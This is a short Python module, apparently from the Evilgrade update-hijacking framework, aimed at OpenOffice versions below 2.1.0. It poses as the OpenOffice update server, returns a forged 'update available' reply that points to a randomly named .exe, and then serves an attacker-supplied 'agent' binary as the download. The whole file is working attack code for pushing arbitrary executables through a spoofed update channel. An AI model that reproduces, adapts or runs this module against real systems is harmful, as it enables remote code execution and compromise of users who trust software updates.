from modules import ModuleBase


class OpenOffice(ModuleBase):
    name = 'openoffice'
    version = '1.0'
    appver = '< 2.1.0'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(update.services.openoffice.org|update23.services.openoffice.org)'
    options = {
        'version': {
            'val' : "'9' + rand_num(3)",
            'hidden': 1,
            'dynamic': 1,
        },
        'source': {
            'val' : "'OO' + rand_alpha(4)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_alpha(rand_num(1))',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': 'ProductUpdateService/check.Update',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string' : "yes\$\$\$http://update.services.openoffice.org/openofficeupdate<%RND1%>.exe\$\$\$buildid=<%VERSION%>\nProductPatch=null\nProductSource=<%SOURCE%>\nProductKey=OpenOffice.org <%VERSION%>\nAllLanguages=es\n_OS=Windows\n_ARCH=x86\n",
            'parse': '1',
            'file': '',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
    }]

